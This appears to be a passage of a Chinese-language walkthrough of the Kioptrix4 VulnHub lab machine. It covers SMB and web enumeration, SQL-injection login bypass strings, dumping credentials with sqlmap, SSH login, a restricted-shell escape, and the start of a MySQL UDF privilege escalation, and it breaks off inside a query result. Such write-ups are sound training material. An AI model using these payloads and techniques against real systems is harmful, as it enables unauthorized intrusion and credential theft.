class="string">&#x27;gmbklnrd&#x27;</span>, password <span class="string">&#x27;&#x27;</span></span><br><span class="line">[H] Rerunning enumeration with user <span class="string">&#x27;gmbklnrd&#x27;</span> might give more results</span><br><span class="line">[*] Enumerating <span class="built_in">users</span> via <span class="string">&#x27;querydispinfo&#x27;</span></span><br><span class="line">[+] Found 5 user(s) via <span class="string">&#x27;querydispinfo&#x27;</span></span><br><span class="line">[*] Enumerating <span class="built_in">users</span> via <span class="string">&#x27;enumdomusers&#x27;</span></span><br><span class="line">[+] Found 5 user(s) via <span class="string">&#x27;enumdomusers&#x27;</span></span><br><span class="line">[+] After merging user results we have 5 user(s) total:</span><br><span class="line">  username: root</span><br><span class="line">  username: loneferret</span><br><span class="line">  username: john</span><br><span class="line">  username: robert</span><br><span class="line">  username: nobody</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>MSF-SMB</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基于SMB协议扫描版本号</span></span><br><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="comment"># 扫描共享文件</span></span><br><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_enumshares</span><br><span class="line"><span class="comment"># 基于SMB进行用户信息枚举</span></span><br><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_lookupsid</span><br></pre></td></tr></table></figure>
+
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><blockquote>
+<p>HTTP Web Server, Port Like: 80 443 81 8080 8443 4443 8081</p>
+</blockquote>
+<ul>
+<li>Finger:获取有关特定用户或系统上的用户列表和配置信息</li>
+</ul>
+<h4 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a><code>whatweb</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用于识别和分析目标网站的技术栈、CMS（内容管理系统）、插件、框架和其他与网站相关的信息。通过分析网站的响应和页面内容</span></span><br><span class="line">┌──(root㉿kill3r)-[~]</span><br><span class="line">└─<span class="comment"># whatweb 192.168.150.130</span></span><br><span class="line">http://192.168.150.130 [200 OK] Apache[2.4.46], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.46 (Debian)], IP[192.168.150.130], Script[text/javascript]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目录枚举</li>
+</ul>
+<p><code>dirb http://192.168.150.130</code></p>
+<p><code>dirsearch -u http://192.168.150.130 -r</code></p>
+<p><code>gobuster dir -w ... -u http://192.168.150.130 -x html,php,js,bak</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kill3r)-[~]</span><br><span class="line">└─<span class="comment"># gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -u http://192.168.150.130 -x html,php,js,bak</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.150.130</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              bak,html,php,js</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: 301) [Size: 358] [--&gt; http://192.168.150.130/images/]                                                              </span><br><span class="line">/index.php            (Status: 200) [Size: 1255]</span><br><span class="line">/.html                (Status: 403) [Size: 327]</span><br><span class="line">/index                (Status: 200) [Size: 1255]</span><br><span class="line">/member               (Status: 302) [Size: 220] [--&gt; index.php]</span><br><span class="line">/member.php           (Status: 302) [Size: 220] [--&gt; index.php]</span><br><span class="line">/logout               (Status: 302) [Size: 0] [--&gt; index.php]</span><br><span class="line">/logout.php           (Status: 302) [Size: 0] [--&gt; index.php]</span><br><span class="line">/john                 (Status: 301) [Size: 356] [--&gt; http://192.168.150.130/john/]                                                                </span><br><span class="line">/robert               (Status: 301) [Size: 358] [--&gt; http://192.168.150.130/robert/]                                                              </span><br><span class="line">/.html                (Status: 403) [Size: 327]</span><br><span class="line">Progress: 1102800 / 1102805 (100.00%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br><span class="line">                                                    </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>漏洞扫描</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nikto -h http://www.example.com/</span><br><span class="line">$ nuclei -u https://example.com/</span><br></pre></td></tr></table></figure>
+
+<h3 id="wordlist"><a href="#wordlist" class="headerlink" title="wordlist"></a>wordlist</h3><ul>
+<li>cewl.list:<code>cewl http://192.168.150.130/ -w dict.txt</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>pass.list</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MyNameIsJohn</span><br><span class="line">ADGAdsafdfwt4gadfga==</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>user.list</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line">loneferret</span><br><span class="line">john</span><br><span class="line">robert</span><br><span class="line">nobody</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>hash.list</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">-  information.list</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="访问靶场-寻找功能点"><a href="#访问靶场-寻找功能点" class="headerlink" title="访问靶场,寻找功能点"></a>访问靶场,寻找功能点</h3><p>发现登录功能,尝试万能密码<code>1&quot; or &quot;1&quot;=&quot;1</code>&#x2F;<code>1&#39; or &#39;1&#39;=&#39;1</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280805678.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280805081.png" data-fancybox="true"/></div></div>
+
+<p>发现报错,并且用户功能点的单引号被转义了,把用户名换成一个正常的试试,密码还是用万能密码</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280805553.png" data-fancybox="true"/></div></div>
+
+<p>发现存在SQL注入,由于是POST请求,使用BURP抓包,用SQLMAP跑一跑</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280805180.png" data-fancybox="true"/></div></div>
+
+<p>保存成文件</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280805067.png" data-fancybox="true"/></div></div>
+
+<h3 id="信息分析"><a href="#信息分析" class="headerlink" title="信息分析"></a>信息分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/vulnhub/0x04]</span><br><span class="line">└─<span class="comment"># sqlmap -r sql.txt --leve 3 --batch --dbs</span></span><br><span class="line">available databases [3]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] members</span><br><span class="line">[*] mysql</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/opt/vulnhub/0x04]</span><br><span class="line">└─<span class="comment"># sqlmap -r sql.txt --leve 3 --batch -D members --tables</span></span><br><span class="line">Database: members</span><br><span class="line">[1 table]</span><br><span class="line">+---------+</span><br><span class="line">| members |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/opt/vulnhub/0x04]</span><br><span class="line">└─<span class="comment"># sqlmap -r sql.txt --leve 3 --batch -D members -T members --dump</span></span><br><span class="line">Database: members</span><br><span class="line">Table: members</span><br><span class="line">[2 entries]</span><br><span class="line">+----+-----------------------+----------+</span><br><span class="line">| <span class="built_in">id</span> | password              | username |</span><br><span class="line">+----+-----------------------+----------+</span><br><span class="line">| 1  | MyNameIsJohn          | john     |</span><br><span class="line">| 2  | ADGAdsafdfwt4gadfga== | robert   |</span><br><span class="line">+----+-----------------------+----------+</span><br></pre></td></tr></table></figure>
+
+<p>使用已知的<code>user.list and pass.list</code>进行密码喷洒</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280805497.png" data-fancybox="true"/></div></div>
+
+<p>Web界面没有功能点</p>
+<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/vulnhub/0x04]</span><br><span class="line">└─<span class="comment"># ssh -o HostKeyAlgorithms=ssh-rsa john@192.168.150.130</span></span><br><span class="line">Welcome to LigGoat Security Systems - We are Watching</span><br><span class="line">== Welcome LigGoat Employee ==</span><br><span class="line">LigGoat Shell is <span class="keyword">in</span> place so you  don<span class="string">&#x27;t screw up</span></span><br><span class="line"><span class="string">Type &#x27;</span>?<span class="string">&#x27; or &#x27;</span><span class="built_in">help</span><span class="string">&#x27; to get the list of allowed commands</span></span><br><span class="line"><span class="string">john:~$ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[/opt/vulnhub/0x04]</span></span><br><span class="line"><span class="string">└─# ssh -o HostKeyAlgorithms=ssh-rsa robert@192.168.150.130</span></span><br><span class="line"><span class="string">Welcome to LigGoat Security Systems - We are Watching</span></span><br><span class="line"><span class="string">== Welcome LigGoat Employee ==</span></span><br><span class="line"><span class="string">LigGoat Shell is in place so you  don&#x27;</span>t screw up</span><br><span class="line">Type <span class="string">&#x27;?&#x27;</span> or <span class="string">&#x27;help&#x27;</span> to get the list of allowed commands</span><br><span class="line">robert:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin colorful note" color="warning"><div class="body"><p>提示:欢迎来到安全系统,很有可能是受限Shell</p></div></div>
+
+<div class="tag-plugin link dis-select"><a class="link-card rich" title="" href="https://jiangjiyue.github.io/2024/07/28/ecc74cbe/" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill="title,icon,desc"><div class="top"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/link/8f277b4ee0ecd.svg"></div><span class="cap link footnote">https://jiangjiyue.github.io/2024/07/28/ecc74cbe/</span></div><div class="bottom"><span class="title">https://jiangjiyue.github.io/2024/07/28/ecc74cbe/</span><span class="cap desc footnote"></span></div></a></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280805025.png" data-fancybox="true"/></div></div>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">john:~$ python -c <span class="string">&#x27;print(&quot;Hello, Python!&quot;)&#x27;</span></span><br><span class="line">*** unknown <span class="built_in">command</span>: python</span><br><span class="line">john:~$ python3 -c <span class="string">&#x27;print(&quot;Hello, Python!&quot;)&#x27;</span></span><br><span class="line">*** unknown <span class="built_in">command</span>: python3</span><br><span class="line">john:~$ ruby -e <span class="string">&#x27;puts &quot;Hello, Ruby!&quot;&#x27;</span></span><br><span class="line">*** unknown <span class="built_in">command</span>: ruby</span><br><span class="line">john:~$ <span class="built_in">echo</span> os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line">john@Kioptrix4:~$ </span><br></pre></td></tr></table></figure>
+
+<h3 id="系统信息收集"><a href="#系统信息收集" class="headerlink" title="系统信息收集"></a>系统信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:/tmp$ <span class="built_in">history</span> </span><br><span class="line">    1  <span class="built_in">exit</span></span><br><span class="line">    2  sudo su</span><br><span class="line">    3  clear</span><br><span class="line">    4  <span class="built_in">ls</span></span><br><span class="line">    5  <span class="built_in">cd</span> /home/loneferret</span><br><span class="line">    6  <span class="built_in">ls</span></span><br><span class="line">    7  ./nc</span><br><span class="line">    8  <span class="built_in">rm</span> nc</span><br><span class="line">    9  <span class="built_in">exit</span></span><br><span class="line">   10  <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line">john@Kioptrix4:/tmp$ <span class="built_in">cat</span> /home/john/.bash_history </span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">sudo su</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> /home/loneferret</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">./nc</span><br><span class="line"><span class="built_in">rm</span> nc</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">john@Kioptrix4:/tmp$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux Kioptrix4 2.6.24-24-server <span class="comment">#1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux</span></span><br><span class="line"></span><br><span class="line">john@Kioptrix4:/tmp$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 8.04.3 LTS</span><br><span class="line">Release:        8.04</span><br><span class="line">Codename:       hardy</span><br><span class="line">john@Kioptrix4:/tmp$ </span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/opt/TOP10/burp]</span><br><span class="line">└─<span class="comment"># searchsploit Ubuntu 8.04.3    </span></span><br><span class="line">--------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                         |  Path</span><br><span class="line">--------------------------------------- ---------------------------------</span><br><span class="line">Ubuntu &lt; 15.10 - PT Chown Arbitrary PT | linux/local/41760.txt</span><br><span class="line">--------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">--------------------------------------- ---------------------------------</span><br><span class="line"> Paper Title                           |  Path</span><br><span class="line">--------------------------------------- ---------------------------------</span><br><span class="line">Debian &lt; 5.0.6 / Ubuntu &lt; 10.04 - Webs | english/15311-debian--5.0.6--ubu</span><br><span class="line">--------------------------------------- ---------------------------------</span><br><span class="line"><span class="comment"># 没有可用漏洞,换方向</span></span><br><span class="line"></span><br><span class="line">john@Kioptrix4:/tmp$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> john: </span><br><span class="line">Sorry, user john may not run sudo on Kioptrix4.</span><br><span class="line"></span><br><span class="line">john@Kioptrix4:/tmp$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/lib/apache2/suexec</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/sudoedit</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/arping</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/mtr</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/sbin/uuidd</span><br><span class="line">/lib/dhcp3-client/call-dhclient-script</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/sbin/umount.cifs</span><br><span class="line">/sbin/mount.cifs</span><br><span class="line"><span class="comment"># 没有,下一位</span></span><br><span class="line">john@Kioptrix4:/home$ <span class="built_in">cd</span> /var/www/</span><br><span class="line">john@Kioptrix4:/var/www$ <span class="built_in">cat</span> checklogin.php </span><br><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line"><span class="variable">$host</span>=<span class="string">&quot;localhost&quot;</span>; // Host name</span><br><span class="line"><span class="variable">$username</span>=<span class="string">&quot;root&quot;</span>; // Mysql username</span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;&quot;</span>; // Mysql password</span><br><span class="line"><span class="variable">$db_name</span>=<span class="string">&quot;members&quot;</span>; // Database name</span><br><span class="line"><span class="variable">$tbl_name</span>=<span class="string">&quot;members&quot;</span>; // Table name</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL无密码,看看能不能第三方应用提权</span></span><br><span class="line">john@Kioptrix4:/var/www$ whereis lib_mysqludf_sys.so</span><br><span class="line">lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so</span><br><span class="line"><span class="comment"># 存在lib_mysqludf_sys.so,尝试udf提权</span></span><br><span class="line">john@Kioptrix4:/var/www$ mysql -uroot -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> is 9786</span><br><span class="line">Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the buffer.</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin link dis-select"><a class="link-card rich" title="" href="https://jiangjiyue.github.io/2020/12/21/466824cf/" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill="title,icon,desc"><div class="top"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/link/8f277b4ee0ecd.svg"></div><span class="cap link footnote">https://jiangjiyue.github.io/2020/12/21/466824cf/</span></div><div class="bottom"><span class="title">https://jiangjiyue.github.io/2020/12/21/466824cf/</span><span class="cap desc footnote"></span></div></a></div>
+
+<h3 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_name <span class="keyword">like</span> <span class="string">&#x27;%fun%&#x27;</span>; </span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+------------+------------+--------+---------+------------+------------+----------------+-------------+--------------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-----------------+----------+----------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> TABLE_CATALOG <span class="operator">|</span> TABLE_SCHEMA <span class="operator">|</span> TABLE_NAME <span class="operator">|</span> TABLE_TYPE <span class="operator">|</span> ENGINE <span class="operator">|</span> VERSION <span class="operator">|</span> ROW_FORMAT <span class="operator">|</span> TABLE_ROWS <span class="operator">|</span> AVG_ROW_LENGTH <span class="operator">|</span> DATA_LENGTH <span class="operator">|</span> MAX_DATA_LENGTH    <span class="operator">|</span> INDEX_LENGTH <span class="operator">|</span> DATA_FREE <span class="operator">|</span> AUTO_INCREMENT <span class="operator">|</span> CREATE_TIME         <span class="operator">|</span> UPDATE_TIME         <span class="operator">|</span> CHECK_TIME          <span class="operator">|</span> TABLE_COLLATION <span class="operator">|</span> CHECKSUM <span class="operator">|</span> CREATE_OPTIONS <span class="operator">|</span> TABLE_COMMENT          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+------------+------------+--------+---------+------------+------------+----------------+-------------+--------------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-----------------+----------+----------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>          <span class="operator">|</span> mysql        <span class="operator">|</span> func       <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">3</span> <span class="operator">|</span>            <span class="number">579</span> <span class="operator">|</span>        <span class="number">1737</span> <span class="operator">|</span> <span class="number">162974011515469823</span> <span class="operator">|</span>         <span class="number">2048</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2012</span><span class="number">-02</span><span class="number">-04</span> <span class="number">10</span>:<span class="number">00</span>:<span class="number">35</span> <span class="operator">|</span> <span class="number">2020</span><span class="number">-12</span><span class="number">-21</span> <span class="number">15</span>:<span class="number">24</span>:<span class="number">46</span> <span class="operator">|</span> <span class="number">2020</span><span class="number">-12</span><span class="number">-21</span> <span class="number">10</span>:<span class="number">35</span>:<span class="number">01</span> <span class="operator">|</span> utf8_bin        <span class="operator">|</span>     <span class="keyword">NULL</span> <span 